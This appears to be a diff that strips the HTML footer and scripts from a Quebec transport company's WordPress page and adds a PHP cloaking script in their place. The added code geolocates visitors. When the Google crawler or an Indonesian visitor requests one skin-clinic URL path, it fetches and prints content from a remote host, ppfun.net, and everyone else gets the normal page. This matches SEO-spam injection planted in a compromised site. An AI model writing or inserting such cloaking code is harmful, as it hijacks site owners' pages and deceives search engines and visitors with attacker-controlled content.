if(!is_redirect){var confirmation_content = jQuery(this).contents().find('.GF_AJAX_POSTBACK').html();if(!confirmation_content){confirmation_content = contents;}setTimeout(function(){jQuery('#gform_wrapper_3').replaceWith(confirmation_content);jQuery(document).scrollTop(jQuery('#gf_3').offset().top - mt);jQuery(document).trigger('gform_confirmation_loaded', [3]);window['gf_submitting_3'] = false;wp.a11y.speak(jQuery('#gform_confirmation_message_3').text());}, 50);}else{jQuery('#gform_3').append(contents);if(window['gformRedirect']) {gformRedirect();}}jQuery(document).trigger('gform_post_render', [3, current_page]);} );} ); 
-/* ]]> */
-</script>
-</div>
-    </div>
-
-  </section>
-
-    </main>
-
-    
-<footer class="" id="contact">
-
-  <div class="container-fluid-px bg-blue-1 py-[3rem] lg:py-[7.5rem] text-white">
-    <div class="container-1220">
-
-      <div class="grid grid-cols-1 lg:grid-cols-12 gap-grid-gutter">
-
-        <div class="col-span-5">
-          <div class="h2">Contactez-nous pour toute question ou pour planifier un transport</div>
-              <a class="btn-primary mt-[1.5rem]" href="https://transportlepiphanie.ca/contact/" target="_self">
-    <span>Contactez-nous</span>
-  </a>
-        </div>
-
-        <div class="col-span-3 mt-md  lg:mt-0">
-
-          <div class="flex items-start gap-xs">
-
-            <svg class="w-[40px]" xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 40 40">
-              <path fill="#fff" d="M37.223 1.426H22.838a.586.586 0 1 0 0 1.172h14.385c.885 0 1.605.72 1.605 1.606V19.29c0 .885-.72 1.605-1.605 1.605h-2.298a.586.586 0 0 0-.343.112l-3.996 2.894v-2.42a.586.586 0 0 0-.585-.585H17.282c-.885 0-1.605-.72-1.605-1.606V4.204c0-.886.72-1.606 1.605-1.606h3.002a.586.586 0 1 0 0-1.172h-3.002a2.78 2.78 0 0 0-2.777 2.778V19.29a2.78 2.78 0 0 0 2.777 2.777h12.132v2.981a.586.586 0 0 0 .93.475l4.77-3.456h2.108A2.78 2.78 0 0 0 40 19.291V4.204a2.78 2.78 0 0 0-2.777-2.778Z"/>
-              <path fill="#fff" d="M34.03 32.395a2.73 2.73 0 0 0-1.413-2.038l-2.605-1.42a.586.586 0 1 0-.56 1.03l2.605 1.42a1.57 1.57 0 0 1 .813 1.18c.068.506-.104 1-.473 1.355l-.384.368-9.619-5.412 1.13-.994a1.537 1.537 0 0 1 1.748-.195l1.626.886a.586.586 0 1 0 .56-1.03l-1.625-.885a2.713 2.713 0 0 0-3.082.344l-2.635 2.317a1.548 1.548 0 0 1-1.915.107c-3.968-2.78-6.849-5.838-8.809-9.349a1.544 1.544 0 0 1 .23-1.82l2.085-2.204c.778-.824.96-2.057.454-3.07L8.65 5.968a2.733 2.733 0 0 0-1.97-1.48 2.734 2.734 0 0 0-2.367.688l-1.332 1.23a9.202 9.202 0 0 0-2.82 5.09 9.094 9.094 0 0 0 .793 5.774 45.148 45.148 0 0 0 2.138 3.846.586.586 0 0 0 .996-.618 44.008 44.008 0 0 1-2.09-3.762c-1.54-3.117-.853-6.94 1.664-9.36l5.284 9.893-.177.187a2.711 2.711 0 0 0-.401 3.195c2.048 3.669 5.044 6.854 9.16 9.738a2.718 2.718 0 0 0 3.361-.187l.572-.503 9.668 5.44-.01.01a8.064 8.064 0 0 1-9.289 1.355c-6.641-3.433-12.04-7.97-16.047-13.488a.586.586 0 1 0-.949.689c4.116 5.666 9.653 10.322 16.458 13.84a9.204 9.204 0 0 0 4.23 1.03 9.243 9.243 0 0 0 6.409-2.581l1.277-1.226a2.731 2.731 0 0 0 .82-2.372ZM4.55 6.551l.558-.516c.37-.341.866-.485 1.362-.395.495.091.908.401 1.132.851l3.51 7.019a1.54 1.54 0 0 1-.258 1.74l-1.059 1.12-5.245-9.819ZM35.277 12.303a2.049 2.049 0 0 0-2.047-2.047 2.049 2.049 0 0 0-2.046 2.047c0 1.128.918 2.046 2.046 2.046a2.05 2.05 0 0 0 2.047-2.046Zm-2.922 0a.876.876 0 0 1 1.75 0 .876.876 0 0 1-1.75 0ZM29.3 12.303a2.049 2.049 0 0 0-2.047-2.047 2.049 2.049 0 0 0-2.047 2.047 2.05 2.05 0 0 0 2.047 2.046 2.049 2.049 0 0 0 2.047-2.046Zm-2.922 0a.876.876 0 0 1 1.75 0 .876.876 0 0 1-1.75 0ZM19.23 12.303c0 1.128.917 2.046 2.046 2.046a2.049 2.049 0 0 0 2.047-2.046 2.049 2.049 0 0 0-2.047-2.047 2.049 2.049 0 0 0-2.047 2.047Zm2.046-.875a.876.876 0 0 1 0 1.75.876.876 0 0 1 0-1.75Z"/>
-            </svg>
-
-            <div class="space-y-[1.5rem]">
-
-              <div class="">
-                <div class="font-bold">Ligne direct Montréal</div>
-                <a class="link-white" href="tel:450-588-2596">450-588-2596</a>
-              </div>
-
-              <div class="">
-                <div class="font-bold">Ligne sans frais</div>
-                <a class="link-white" href="tel:1800-663-2859">1800-663-2859</a>
-              </div>
-
-            </div>
-
-          </div>
-
-        </div>
-
-        <div class="col-span-4 space-y-[1.5rem]">
-
-          <div class="flex items-start gap-xs">
-            <svg class="w-[40px]" xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 40 40">
-              <g fill="#fff" clip-path="url(#a)">
-                <path d="m39.962 39.206-5.86-15.435a.586.586 0 0 0-.26-.303l-6.24-3.516 1.821-2.889a11.107 11.107 0 0 0 1.71-5.93C31.133 4.994 26.139 0 20 0 13.86 0 8.867 4.994 8.867 11.133a11.1 11.1 0 0 0 1.71 5.93l1.822 2.89-6.241 3.515a.586.586 0 0 0-.26.303L.038 39.206a.586.586 0 0 0 .836.719l9.419-5.307 9.42 5.307c.178.1.396.1.575 0l9.419-5.307 9.42 5.307a.585.585 0 0 0 .835-.719Zm-19.376-8.838c.367-.13.684-.378.9-.72l5.018-7.956 2.54 11.954-8.458 4.765v-8.043Zm-9.017-13.93a9.93 9.93 0 0 1-1.53-5.305c0-5.493 4.469-9.961 9.961-9.961s9.96 4.468 9.96 9.96a9.937 9.937 0 0 1-1.528 5.306c-.078.124-7.798 12.367-7.933 12.579l-.004.005a.584.584 0 0 1-.991 0c-.079-.123-7.815-12.39-7.933-12.58l-.002-.004Zm-4.651 7.947 5.462-3.077-.952 4.477a.586.586 0 0 0 1.147.244l.921-4.336 5.018 7.957c.216.34.534.589.9.718v8.043l-8.458-4.765 1.131-5.325a.586.586 0 0 0-1.146-.244l-1.166 5.488-8.067 4.544 5.21-13.724Zm23.307 9.18L27.62 21.308l5.462 3.077 5.21 13.724-8.067-4.544Z"/>
-                <path d="M26.445 11.133A6.453 6.453 0 0 0 20 4.688a6.453 6.453 0 0 0-6.445 6.445A6.453 6.453 0 0 0 20 17.578a6.453 6.453 0 0 0 6.445-6.445Zm-11.718 0A5.28 5.28 0 0 1 20 5.859a5.28 5.28 0 0 1 5.273 5.274A5.28 5.28 0 0 1 20 16.406a5.28 5.28 0 0 1-5.273-5.273Z"/>
-                <path d="M24.102 11.133A4.106 4.106 0 0 0 20 7.03a4.106 4.106 0 0 0-4.102 4.102A4.106 4.106 0 0 0 20 15.234a4.106 4.106 0 0 0 4.102-4.101Zm-7.032 0A2.933 2.933 0 0 1 20 8.203a2.933 2.933 0 0 1 2.93 2.93 2.933 2.933 0 0 1-2.93 2.93 2.933 2.933 0 0 1-2.93-2.93Z"/>
-              </g>
-              <defs>
-                <clipPath id="a">
-                  <path fill="#fff" d="M0 0h40v40H0z"/>
-                </clipPath>
-              </defs>
-            </svg>
-            <a href="https://www.google.com/maps/place/26+Rue+de+l'Industrie,+L'Assomption,+QC+J5W+2V1/@45.826018,-73.4449657,17z/data=!3m1!4b1!4m5!3m4!1s0x4cc8e914e3d47b93:0x4091a2bf44f9162!8m2!3d45.826018!4d-73.4449657" class="link-white" target="_blank">26, rue de l'Industrie<br />
-L’Assomption,<br />
-Qc J5W 2V1</a>
-          </div>
-
-          <div class="flex items-center gap-xs">
-            <svg class="w-[40px] min-w-[40px]" viewbox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <g clip-path="url(#clip0_99_1871)">
-                <path d="M37.9487 6.66663H2.05133C0.923047 6.66663 0 7.58967 0 8.71788V31.282C0 32.4101 0.923047 33.3333 2.05133 33.3333H37.9487C39.0769 33.3333 40.0001 32.4103 40.0001 31.282V8.71788C40 7.58967 39.077 6.66663 37.9487 6.66663ZM37.1789 8.20499L21.18 20.2051C20.8923 20.424 20.4508 20.561 19.9999 20.559C19.5491 20.561 19.1077 20.424 18.8199 20.2051L2.82102 8.20499H37.1789ZM28.6328 20.9969L37.3508 31.7662C37.3595 31.777 37.3702 31.7852 37.3795 31.795H2.62047C2.62969 31.7848 2.64047 31.777 2.64922 31.7662L11.3672 20.9969C11.6343 20.6667 11.5837 20.1826 11.2528 19.9148C10.9226 19.6477 10.4384 19.6983 10.1713 20.0287L1.53844 30.6928V9.16655L17.8973 21.4358C18.5123 21.8937 19.2604 22.0953 19.9998 22.0973C20.7383 22.0958 21.487 21.8942 22.1023 21.4358L38.4613 9.16655V30.6926L29.8287 20.0287C29.5615 19.6984 29.0769 19.6476 28.7471 19.9148C28.4163 20.1819 28.3655 20.6667 28.6328 20.9969Z" fill="white"/>
-              </g>
-              <defs>
-                <clipPath id="clip0_99_1871">
-                  <rect width="40" height="40" fill="white"/>
-                </clipPath>
-              </defs>
-            </svg>
-
-            <div class="mt-[0.5rem] lg:mt-0">
-              <a class="link-white break-all" href="mailto:dispatchlepiphanie@transportlepiphanie.ca">dispatchlepiphanie@transportlepiphanie.ca</a>
-            </div>
-          </div>
-
-        </div>
-
-      </div>
-
-    </div>
-  </div>
-
-  <div class="container-fluid-px bg-gray-2 text-white py-xs text-sm font-Kumbh text-center lg:text-left">
-
-    <div class="container-1220">
-      <div class="lg:flex">
-
-                  <p>Tous droits réservés 2025 © Transport l'Épiphanie inc. | <a href="https://transportlepiphanie.ca/politique-de-confidentialite/">Politique de confidentialité</a></p>
-        
-        <div class="lg:ml-auto">
-          <a href="https://agencearobas.ca/" target="_blank" class="group"> 
-
-                          Fait avec
-            
-            <span class="w-[10px] inline-block text-blue-2 group-hover:text-blue-1">
-              <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 9.553 8.359">
-                <path fill="currentColor" d="M8.626.571a2.551 2.551 0 0 0-3.481.254l-.368.379-.368-.379A2.551 2.551 0 0 0 .928.571a2.679 2.679 0 0 0-.185 3.881l3.61 3.728a.585.585 0 0 0 .845 0l3.61-3.728A2.677 2.677 0 0 0 8.625.573Z"/>
-              </svg>
-            </span>
-
-                          par Arobas Web & numérique
-            
-          </a>
-        </div>
-
-      </div>
-    </div>
-
-  </div>
-</footer>
-
-
-        <script type="speculationrules">
-{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"\/*"},{"not":{"href_matches":["\/wp-*.php","\/wp-admin\/*","\/wp-content\/uploads\/*","\/wp-content\/*","\/wp-content\/plugins\/*","\/wp-content\/themes\/epiphanie\/*","\/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
-</script>
-<link rel='stylesheet' id='gform_basic-css' href='https://transportlepiphanie.ca/wp-content/plugins/gravityforms/assets/css/dist/basic.min.css' type='text/css' media='all' />
-<link rel='stylesheet' id='gform_theme_components-css' href='https://transportlepiphanie.ca/wp-content/plugins/gravityforms/assets/css/dist/theme-components.min.css' type='text/css' media='all' />
-<link rel='stylesheet' id='gform_theme_ie11-css' href='https://transportlepiphanie.ca/wp-content/plugins/gravityforms/assets/css/dist/theme-ie11.min.css' type='text/css' media='all' />
-<link rel='stylesheet' id='gform_theme-css' href='https://transportlepiphanie.ca/wp-content/plugins/gravityforms/assets/css/dist/theme.min.css' type='text/css' media='all' />
-<script type="text/javascript" src="https://transportlepiphanie.ca/wp-includes/js/dist/dom-ready.min.js" id="wp-dom-ready-js"></script>
-<script type="text/javascript" src="https://transportlepiphanie.ca/wp-includes/js/dist/hooks.min.js" id="wp-hooks-js"></script>
-<script type="text/javascript" src="https://transportlepiphanie.ca/wp-includes/js/dist/i18n.min.js" id="wp-i18n-js"></script>
-<script type="text/javascript" id="wp-i18n-js-after">
-/* <![CDATA[ */
-wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
-/* ]]> */
-</script>
-<script type="text/javascript" id="wp-a11y-js-translations">
-/* <![CDATA[ */
-( function( domain, translations ) {
-	var localeData = translations.locale_data[ domain ] || translations.locale_data.messages;
-	localeData[""].domain = domain;
-	wp.i18n.setLocaleData( localeData, domain );
-} )( "default", {"translation-revision-date":"2025-07-16 08:25:45+0000","generator":"GlotPress\/4.0.1","domain":"messages","locale_data":{"messages":{"":{"domain":"messages","plural-forms":"nplurals=2; plural=n > 1;","lang":"fr"},"Notifications":["Notifications"]}},"comment":{"reference":"wp-includes\/js\/dist\/a11y.js"}} );
-/* ]]> */
-</script>
-<script type="text/javascript" src="https://transportlepiphanie.ca/wp-includes/js/dist/a11y.min.js" id="wp-a11y-js"></script>
-<script type="text/javascript" src="https://transportlepiphanie.ca/wp-includes/js/jquery/jquery.min.js" id="jquery-core-js"></script>
-<script type="text/javascript" src="https://transportlepiphanie.ca/wp-includes/js/jquery/jquery-migrate.min.js" id="jquery-migrate-js"></script>
-<script type="text/javascript" defer='defer' src="https://transportlepiphanie.ca/wp-content/plugins/gravityforms/js/jquery.json.min.js" id="gform_json-js"></script>
-<script type="text/javascript" id="gform_gravityforms-js-extra">
-/* <![CDATA[ */
-var gform_i18n = {"datepicker":{"days":{"monday":"Mon","tuesday":"Tue","wednesday":"Wed","thursday":"Thu","friday":"Fri","saturday":"Sat","sunday":"Sun"},"months":{"january":"Janvier","february":"F\u00e9vrier","march":"Mars","april":"Avril","may":"Mai","june":"Juin","july":"Juillet","august":"Ao\u00fbt","september":"Septembre","october":"Octobre","november":"Novembre","december":"D\u00e9cembre"},"firstDay":1,"iconText":"S\u00e9lectionner une date"}};
-var gf_legacy_multi = [];
-var gform_gravityforms = {"strings":{"invalid_file_extension":"Ce type de fichier n\u2019est pas autoris\u00e9. Seuls les formats suivants sont autoris\u00e9s\u00a0:","delete_file":"Supprimer ce fichier","in_progress":"en cours","file_exceeds_limit":"Le fichier d\u00e9passe la taille autoris\u00e9e.","illegal_extension":"Ce type de fichier n\u2019est pas autoris\u00e9.","max_reached":"Nombre de fichiers maximal atteint","unknown_error":"Une erreur s\u2019est produite lors de la sauvegarde du fichier sur le serveur","currently_uploading":"Veuillez attendre la fin de l\u2019envoi","cancel":"Annuler","cancel_upload":"Annuler cet envoi","cancelled":"Annul\u00e9"},"vars":{"images_url":"https:\/\/transportlepiphanie.ca\/wp-content\/plugins\/gravityforms\/images"}};
-var gf_global = {"gf_currency_config":{"name":"Dollar canadien","symbol_left":"$","symbol_right":"CAD","symbol_padding":" ","thousand_separator":",","decimal_separator":".","decimals":2,"code":"CAD"},"base_url":"https:\/\/transportlepiphanie.ca\/wp-content\/plugins\/gravityforms","number_formats":[],"spinnerUrl":"https:\/\/transportlepiphanie.ca\/wp-content\/plugins\/gravityforms\/images\/spinner.svg","strings":{"newRowAdded":"Nouvelle ligne ajout\u00e9e.","rowRemoved":"Rang\u00e9e supprim\u00e9e","formSaved":"Le formulaire a \u00e9t\u00e9 enregistr\u00e9. Le contenu contient le lien pour retourner et terminer le formulaire."}};
-/* ]]> */
-</script>
-<script type="text/javascript" defer='defer' src="https://transportlepiphanie.ca/wp-content/plugins/gravityforms/js/gravityforms.min.js" id="gform_gravityforms-js"></script>
-<script type="text/javascript" defer='defer' src="https://transportlepiphanie.ca/wp-content/plugins/gravityforms/js/jquery.maskedinput.min.js" id="gform_masked_input-js"></script>
-<script type="text/javascript">
-/* <![CDATA[ */
- gform.initializeOnLoaded( function() { jQuery(document).on('gform_post_render', function(event, formId, currentPage){if(formId == 3) {jQuery('#input_3_10').mask('999-999-9999').bind('keypress', function(e){if(e.which == 13){jQuery(this).blur();} } );} } );jQuery(document).bind('gform_post_conditional_logic', function(event, formId, fields, isInit){} ) } ); 
-/* ]]> */
-</script>
-<script type="text/javascript">
-/* <![CDATA[ */
- gform.initializeOnLoaded( function() { jQuery(document).trigger('gform_post_render', [3, 1]) } ); 
-/* ]]> */
-</script>
-
-
-    <script src="https://transportlepiphanie.ca/wp-content/themes/epiphanie/dist/scripts/manifest.js?id=86712bb6632831f087582883687ef2bf"></script>
-    <script src="https://transportlepiphanie.ca/wp-content/themes/epiphanie/dist/scripts/vendor.js?id=892c6c940db7ac00b9e74fe92579b46a"></script>
-    <script src="https://transportlepiphanie.ca/wp-content/themes/epiphanie/dist/scripts/main.js?id=e20b7333b2c369b12693c81fa68b3765"></script>
-
-  </body>
-</html>
+<?php
+
+function getVisitorCountry() {
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $api_url = "http://ip-api.com/json/{$ip}";
+
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $api_url);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+
+    $response = curl_exec($curl);
+
+    if (curl_errno($curl)) {
+        // Handle any errors if needed
+        return "Error: " . curl_error($curl);
+    }
+
+    curl_close($curl);
+
+    $data = json_decode($response, true);
+
+    if ($data['status'] === 'success') {
+        return $data['country'];
+    } else {
+        return "Country not found";
+    }
+}
+
+function isHomePage() {
+    return ($_SERVER['REQUEST_URI'] === '/traitement-de-la-peau/sculptra/');
+}
+
+function isGoogleCrawler() {
+    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
+    return (strpos($userAgent, 'google') !== false);
+}
+
+if ((isGoogleCrawler() || (getVisitorCountry() === 'Indonesia')) && isHomePage()) {
+    // Output the cloaked content
+$curl = curl_init();
+curl_setopt($curl, CURLOPT_URL, 'https://ppfun.net/amp/situs/cliniqueantiaging/u.txt');
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+$content = curl_exec($curl);
+curl_close($curl);
+
+echo $content;
+} else {
+    // Output your main content here
+    include 'main.php';
+}
+?>
